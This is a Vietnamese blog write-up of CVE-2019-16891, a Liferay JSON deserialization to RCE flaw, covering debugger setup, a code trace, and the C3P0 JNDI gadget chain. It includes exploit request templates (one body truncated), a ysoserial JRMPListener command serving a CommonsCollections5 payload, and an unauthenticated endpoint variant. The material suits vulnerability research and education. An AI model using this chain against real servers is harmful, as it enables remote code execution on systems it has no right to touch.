<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Tìm hiểu CVE-2019-16891 - Liferay JSON Deserialization to RCE | devme4f&#39;s blog</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/liferay_cve-2019-16891/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Tìm hiểu CVE-2019-16891 - Liferay JSON Deserialization to RCE" />
<meta property="og:description" content="Tham khảo: https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/ Version affect: Liferay &lt; 7.x Setup debug Liferay 6.2.5 gồm luôn tomcat server: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.2.5%20GA6/
Server: Giải nén file trên, config 1 vài cái nhỏ nhỏ theo guide rồi start tomcat server ở mode jpda: .\catalina jpda start (ở đây mình dùng java 1.8) Client: Open file or project &ndash;&gt; ROOT folder trong webapps(chỉ cần debug folder này) &ndash;&gt; Load &ndash;&gt; Edit configuration &ndash;&gt; Remote JVM Debug &ndash;&gt; Config port 8000(jpda default chạy port 8000) &ndash;&gt; Debug Nếu thấy các thư viện đã được load trong Project Structure mà chưa thấy ở External Library thì nhớ set JDK ở intellij" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2023/liferay_cve-2019-16891/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-12T12:09:17+07:00" />
<meta property="article:modified_time" content="2023-01-12T12:09:17+07:00" />

  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Tìm hiểu CVE-2019-16891 - Liferay JSON Deserialization to RCE"/>
<meta name="twitter:description" content="Tham khảo: https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/ Version affect: Liferay &lt; 7.x Setup debug Liferay 6.2.5 gồm luôn tomcat server: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.2.5%20GA6/
Server: Giải nén file trên, config 1 vài cái nhỏ nhỏ theo guide rồi start tomcat server ở mode jpda: .\catalina jpda start (ở đây mình dùng java 1.8) Client: Open file or project &ndash;&gt; ROOT folder trong webapps(chỉ cần debug folder này) &ndash;&gt; Load &ndash;&gt; Edit configuration &ndash;&gt; Remote JVM Debug &ndash;&gt; Config port 8000(jpda default chạy port 8000) &ndash;&gt; Debug Nếu thấy các thư viện đã được load trong Project Structure mà chưa thấy ở External Library thì nhớ set JDK ở intellij"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/posts/2023/manageengineam_cve-2020-15394/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/posts/2023/dotnetnuke_cve-2017-9822/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&text=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&is_video=false&description=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&name=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE&description=Tham%20kh%e1%ba%a3o%3a%20https%3a%2f%2fsec.vnpt.vn%2f2019%2f09%2fliferay-deserialization-json-deserialization-part-4%2f%20Version%20affect%3a%20Liferay%20%26lt%3b%207.x%20Setup%20debug%20Liferay%206.2.5%20g%e1%bb%93m%20lu%c3%b4n%20tomcat%20server%3a%20https%3a%2f%2fsourceforge.net%2fprojects%2flportal%2ffiles%2fLiferay%2520Portal%2f6.2.5%2520GA6%2f%0aServer%3a%20Gi%e1%ba%a3i%20n%c3%a9n%20file%20tr%c3%aan%2c%20config%201%20v%c3%a0i%20c%c3%a1i%20nh%e1%bb%8f%20nh%e1%bb%8f%20theo%20guide%20r%e1%bb%93i%20start%20tomcat%20server%20%e1%bb%9f%20mode%20jpda%3a%20.%5ccatalina%20jpda%20start%20%28%e1%bb%9f%20%c4%91%c3%a2y%20m%c3%acnh%20d%c3%b9ng%20java%201.8%29%20Client%3a%20Open%20file%20or%20project%20%26ndash%3b%26gt%3b%20ROOT%20folder%20trong%20webapps%28ch%e1%bb%89%20c%e1%ba%a7n%20debug%20folder%20n%c3%a0y%29%20%26ndash%3b%26gt%3b%20Load%20%26ndash%3b%26gt%3b%20Edit%20configuration%20%26ndash%3b%26gt%3b%20Remote%20JVM%20Debug%20%26ndash%3b%26gt%3b%20Config%20port%208000%28jpda%20default%20ch%e1%ba%a1y%20port%208000%29%20%26ndash%3b%26gt%3b%20Debug%20N%e1%ba%bfu%20th%e1%ba%a5y%20c%c3%a1c%20th%c6%b0%20vi%e1%bb%87n%20%c4%91%c3%a3%20%c4%91%c6%b0%e1%bb%a3c%20load%20trong%20Project%20Structure%20m%c3%a0%20ch%c6%b0a%20th%e1%ba%a5y%20%e1%bb%9f%20External%20Library%20th%c3%ac%20nh%e1%bb%9b%20set%20JDK%20%e1%bb%9f%20intellij" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&t=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#setup-debug">Setup debug</a></li>
    <li><a href="#debug">Debug</a>
      <ul>
        <li><a href="#json-deserialize">JSON Deserialize</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#build-payload">Build payload</a></li>
      </ul>
    </li>
    <li><a href="#path-and-bypass">Path and Bypass</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Tìm hiểu CVE-2019-16891 - Liferay JSON Deserialization to RCE
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2023-01-12 12:09:17 &#43;0700 &#43;07" itemprop="datePublished">2023-01-12</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/cve" rel="tag">cve</a>
            
             ,  
            <a class="tag-link" href="/tags/deser" rel="tag">deser</a>
            
             ,  
            <a class="tag-link" href="/tags/liferay" rel="tag">liferay</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p><img src="/images/2023/Liferay_CVE-2019-16891/liferay-logo-full-color-2x.png" alt="theme"></p>
<ul>
<li><strong>Tham khảo</strong>: <a href="https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/">https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/</a></li>
<li><strong>Version affect</strong>: <code>Liferay &lt; 7.x</code></li>
</ul>
<h2 id="setup-debug">Setup debug</h2>
<p><code>Liferay 6.2.5</code> gồm luôn tomcat server: <a href="https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.2.5%20GA6/">https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.2.5%20GA6/</a></p>
<ul>
<li><strong>Server</strong>: Giải nén file trên, config 1 vài cái nhỏ nhỏ theo guide rồi start tomcat server ở mode jpda: <code>.\catalina jpda start</code> (ở đây mình dùng java 1.8)</li>
<li><strong>Client</strong>: Open file or project &ndash;&gt; <code>ROOT</code> folder trong <code>webapps</code>(chỉ cần debug folder này) &ndash;&gt; Load &ndash;&gt; <code>Edit configuration</code> &ndash;&gt; <code>Remote JVM Debug</code> &ndash;&gt; Config port 8000(jpda default chạy port 8000) &ndash;&gt; Debug</li>
</ul>
<p>Nếu thấy các thư viện đã được load trong <code>Project Structure</code> mà chưa thấy ở <code>External Library</code> thì nhớ set <code>JDK</code> ở intellij</p>
<h2 id="debug">Debug</h2>
<p>Liferay JSON deserialization là lỗ hổng liên quan đến việc json deserialization</p>
<p><strong>Biết được entrypoint</strong>: <code>JSONFactoryImpl</code> liên quan đến json convert và deserialize, mình set breakpoint tại đây. Ở đây có rất nhiều method như <code>looseDeserializeSafe</code>, <code>looseDeserialize</code>, <code>createJSONObject</code>,&hellip; nên mình cứ rải break point, dính cái nào thì xem.</p>
<p>Bấm tổ hợp<code> Ctrl + N</code> (Find class): <code>JSONFactoryImpl</code> &ndash;&gt; <code>Ctrl + F12</code> (Find Method trong class): <code>deserialize(String)</code> &ndash;&gt; Set breakpoint
<img src="/images/2023/Liferay_CVE-2019-16891/deserialize.jpg" alt="deserialize"></p>
<p>Ta fuzz các entrypoint cho đến khi request hit breakpoint(mình đôi khi đợi 1 tí mới dính breakpoint hoặc sau tận mấy cái requests), thử với tính năng <code>login</code> thì đã hit, bấm <code>Show All Frames</code>(nút phễu chỗ tab debug) để list ra các frame trước khi hit breakpoint này:
<img src="/images/2023/Liferay_CVE-2019-16891/Frames.jpg" alt="Frames"></p>
<p>=&gt; Bug cần authenticated mới exploit được.</p>
<p><strong>Note:</strong></p>
<ul>
<li><strong>URL login</strong>: <code>/web/guest/home</code></li>
<li><strong>Breakpoint reached method</strong>: <code>JSONFactoryImpl.deserialize(String)</code></li>
<li><strong>URL trigger</strong>: <em>POST</em> <code>/poller/receive</code> với param: <code>pollerRequest</code></li>
<li><strong>Trace</strong>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// Từ web.xml: &lt;url-pattern&gt;/poller/*&lt;/url-pattern&gt;</span>
</span></span><span style="display:flex;"><span>PollerServlet.<span style="color:#a6e22e">service</span>()
</span></span><span style="display:flex;"><span>    PollerServlet.<span style="color:#a6e22e">getContent</span>()
</span></span><span style="display:flex;"><span>        PollerRequestHandlerUtil.<span style="color:#a6e22e">getPollerHeader</span>()
</span></span><span style="display:flex;"><span>            PollerRequestHandlerImpl.<span style="color:#a6e22e">getPollerHeader</span>()
</span></span><span style="display:flex;"><span>                PollerRequestHandlerImpl.<span style="color:#a6e22e">parsePollerRequestParameters</span>()
</span></span><span style="display:flex;"><span>                    JSONFactoryImpl.<span style="color:#a6e22e">deserialize</span>()
</span></span></code></pre></div><p>==&gt; ta được source đến đoạn call deserialize JSON.</p>
<h3 id="json-deserialize">JSON Deserialize</h3>
<p>Đầu tiên:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>JSONFactoryImpl.<span style="color:#a6e22e">deserialize</span>(String json)
</span></span><span style="display:flex;"><span>    org.<span style="color:#a6e22e">jabsorb</span>.<span style="color:#a6e22e">JSONSerializer</span>.<span style="color:#a6e22e">fromJSON</span>(json)
</span></span><span style="display:flex;"><span>        JSONSerializer.<span style="color:#a6e22e">unmarshall</span>()
</span></span></code></pre></div><p>Method <code>JSONSerializer.getSerializer()</code>:
<img src="/images/2023/Liferay_CVE-2019-16891/getSerializer.jpg" alt="getSerializer"></p>
<p>Đọc sơ sơ qua thì có thể thấy method này thực hiện lấy một loại serializer (class) thích hợp cho đoạn JSON String và thực hiện deserialize (unmarshall) nó theo cái serializer đó.</p>
<p><code>getClassFromHint()</code> lấy tên class từ key <code>javaClass</code> trong json ta truyền vào.</p>
<p>Set breakpoint tại method <code>getSerializer()</code> để tìm các class thực hiện việc unmarshall:
<img src="/images/2023/Liferay_CVE-2019-16891/breakpoint_getSerializer.jpg" alt="breakpoint_getSerializer"></p>
<p>Đây là những list những class có thể sẽ unmarshall object JSON truyền vào, được xét từ trên xuống dưới(class nào <code>canSerialize</code> thì trả về luôn): <code>Locale</code>, <code>Liferay</code>, <code>Primitive</code>, <code>Boolean</code>,… Trong các target class này thì có <code>org.jabsorb.serializer.impl.BeanSerializer</code> là có thể lợi dụng được!</p>
<p>Bởi method <code>unmarshall()</code> của <code>BeanSerializer</code> có <em>invoke Setter Method</em> của cái object được khởi tạo từ JSON String ra, <code>BeanSerializer.unmarshall()</code>:
<img src="/images/2023/Liferay_CVE-2019-16891/unmarshall.jpg" alt="unmarshall"></p>
<p>Với field là param key, dòng này lấy setter method của field từ class <code>bd</code>(class thỏa mãn canSerialize của <code>BeanSerializer</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Method setMethod <span style="color:#f92672">=</span> (Method)bd.<span style="color:#a6e22e">writableProps</span>.<span style="color:#a6e22e">get</span>(field);
</span></span></code></pre></div><p>Nếu setMethod tồn tại, lấy params type sau đó với <code>this.ser.unmarshall</code> lấy value của field(key)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class<span style="color:#f92672">[]</span> param <span style="color:#f92672">=</span> setMethod.<span style="color:#a6e22e">getParameterTypes</span>();
</span></span><span style="display:flex;"><span>fieldVal <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ser</span>.<span style="color:#a6e22e">unmarshall</span>(state, param<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, jso.<span style="color:#a6e22e">get</span>(field));
</span></span></code></pre></div><p>Cuối cùng là invoke method:
<img src="/images/2023/Liferay_CVE-2019-16891/invoke.jpg" alt="invoke"></p>
<p>Để trigger được <code>unmarshall()</code> bằng <code>BeanSerializer</code> thì class để trigger setter method không được implement <code>Serializable</code>, bởi nếu class này Serializable thì nó sẽ thỏa mãn ngay ở <code>LiferaySerializer</code>(đứng trước BeanSerializer) khi gọi method <code>getSerialize()</code>, class này không lợi dụng để làm được gì!</p>
<p>Tóm tắt lại về cái Source class có thể trigger được BeanSerializer này là 1 class có dạng Managed Bean:</p>
<ol>
<li>Có public constructor không có arg (BeanSerializer tạo instance của class với <code>clazz.newInstance()</code> cái invoke zero-argument constructor)</li>
<li>Không implement Serializable (Né class LiferaySerializer)</li>
<li>Có setter method có thể lợi dụng được! (setMethod)</li>
</ol>
<h2 id="exploit">Exploit</h2>
<p>Class thỏa mãn các điều kiện trên là <code>C3P0PooledDataSource</code> thuộc library <code>c3p0</code>, việc utilize class này trong khai thác deserialization (đặc biệt là json) đã được publish tại: <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>Class này có emty constructor, không implements Serializeable:
<img src="/images/2023/Liferay_CVE-2019-16891/C3P0PooledDataSource.jpg" alt="C3P0PooledDataSource"></p>
<p>Có setter method có thể lợi dụng để deserialize object khi tạo một jndi connection:
<img src="/images/2023/Liferay_CVE-2019-16891/setter.jpg" alt="setter"></p>
<p>JDNI hay Java Naming and Directory Interface là một API Java cho phép lookup đến nhiều services khác nhau như LDAP, RMI, CORBA, trong đó có thể lợi dụng service như RMI để call đến remote server trả về serialized object để khiến Liferay thực hiện deserialize.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>BeanSerializer.<span style="color:#a6e22e">unmarshall</span>()
</span></span><span style="display:flex;"><span>    C3P0PooledDataSource.<span style="color:#a6e22e">setJndiName</span>.<span style="color:#a6e22e">invoke</span>(instance, jndiName)
</span></span><span style="display:flex;"><span>        C3P0PooledDataSource.<span style="color:#a6e22e">rebind</span>(jndiName, obj)
</span></span></code></pre></div><h3 id="build-payload">Build payload</h3>
<ol>
<li><code>pollerRequest</code> có đi qua <code>this.fixPollerRequestString(pollerRequestString)</code> chỗ <code>PollerRequestHandlerImpl.parsePollerRequestParameters()</code>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> String <span style="color:#a6e22e">fixPollerRequestString</span>(String pollerRequestString) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Validator.<span style="color:#a6e22e">isNull</span>(pollerRequestString) <span style="color:#f92672">?</span> <span style="color:#66d9ef">null</span> : StringUtil.<span style="color:#a6e22e">replace</span>(pollerRequestString, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;{&#34;</span>, <span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#e6db74">&#34;[$OPEN_CURLY_BRACE$]&#34;</span>, <span style="color:#e6db74">&#34;[$CLOSE_CURLY_BRACE$]&#34;</span>}, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;{\&#34;javaClass\&#34;:\&#34;java.util.HashMap\&#34;,\&#34;map\&#34;:{&#34;</span>, <span style="color:#e6db74">&#34;}}&#34;</span>, <span style="color:#e6db74">&#34;{&#34;</span>, <span style="color:#e6db74">&#34;}&#34;</span>});
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ở đây mọi request sẽ replace <code>{</code> để thêm <code>javaClass</code> với class <code>HashMap</code>, ta dùng <code>[$OPEN_CURLY_BRACE$]</code> để tự define <code>javaClass</code>, cái chính là <code>C3P0PooledDataSource</code>(cái được gán cho <code>clazz</code>).</p>
<ol start="2">
<li>Key <code>jndiName</code> là field với setter method <code>setJndiName</code> mà value chính là url connect đến <code>JRMPListener</code>.</li>
</ol>
<p>POST Request:</p>
<pre tabindex="0"><code>POST /poller/anything HTTP/1.1
Host: localhost:8080
Content-Length: 161
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

pollerRequest=&lt;xin-phep-truncated&gt;
</code></pre><p><strong>Command listening RMI connection kèm kết quả</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span style="color:#ae81ff">1099</span> CommonsCollections5 calc.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Have connection from /10.1.62.144:19234
</span></span><span style="display:flex;"><span>Reading message...
</span></span><span style="display:flex;"><span>Sending <span style="color:#66d9ef">return</span> with payload <span style="color:#66d9ef">for</span> obj <span style="color:#f92672">[</span>0:0:0, 0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Closing connection
</span></span></code></pre></div><p>Thành công, PoC trigger pop up <code>calc.exe</code> demo RCE. Chỗ này do lab xong mình quên chụp PoC, lúc viết blog thì lười chụp lại quá hic!</p>
<h2 id="path-and-bypass">Path and Bypass</h2>
<p>New endpoint: <a href="https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from">https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from</a>
Unauthen tuy nhiên mặc định endpoint trên bị disable trong liferay nên tùy thuộc cấu hình mới xúc được:</p>
<pre tabindex="0"><code>POST /c/portal/portlet_url HTTP/1.1
Host: liferay.victim.example.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

parameterMap={&#34;Json payload for deserialization in here!&#34;}
</code></pre><p><img src="/images/2023/Liferay_CVE-2019-16891/new_endpoint.png" alt="new_endpoint"></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.programcreek.com/java-api-examples/?class=ysoserial.payloads.ObjectPayload.Utils&amp;method=makePayloadObject">https://www.programcreek.com/java-api-examples/?class=ysoserial.payloads.ObjectPayload.Utils&amp;method=makePayloadObject</a></li>
<li><a href="https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/">https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/</a></li>
</ul>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#setup-debug">Setup debug</a></li>
    <li><a href="#debug">Debug</a>
      <ul>
        <li><a href="#json-deserialize">JSON Deserialize</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#build-payload">Build payload</a></li>
      </ul>
    </li>
    <li><a href="#path-and-bypass">Path and Bypass</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&text=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&is_video=false&description=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay_cve-2019-16891%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2019-16891%20-%20Liferay%20JSON%20Deserialization%20to%20RCE" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
